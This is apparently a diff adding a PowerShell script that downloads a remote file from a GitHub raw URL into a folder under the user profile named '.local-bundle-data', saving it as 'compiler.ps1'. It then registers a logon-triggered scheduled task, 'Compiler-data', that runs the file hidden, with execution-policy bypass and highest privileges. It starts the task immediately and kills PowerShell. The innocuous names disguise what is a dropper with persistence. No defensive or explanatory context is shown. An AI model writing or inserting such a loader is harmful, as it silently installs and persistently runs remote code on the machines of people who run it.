@@ -1,0 +1,19 @@
+$url = "https://raw.githubusercontent.com/Dannesch/test/main/code.ps1"
+$directory = $Env:USERPROFILE + "\.local-bundle-data\"
+if (-not (Test-Path -Path $directory -PathType Container)){
+    New-Item -Path $directory -ItemType Directory
+}
+$file = $directory + "compiler.ps1"
+
+$file_content = Invoke-WebRequest -Uri $url
+$file_content | Add-Content -Path $file
+
+$task = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-W Hidden -Exec Bypass %USERPROFILE%\.local-bundle-data\compiler.ps1'
+$trigger = New-ScheduledTaskTrigger -AtLogOn 
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
+
+Register-ScheduledTask -Trigger $trigger -Action $task -RunLevel Highest -Settings $settings -TaskName "Compiler-data"
+
+Start-ScheduledTask -TaskName "Compiler-data"
+
+stop-process -Name Powershell
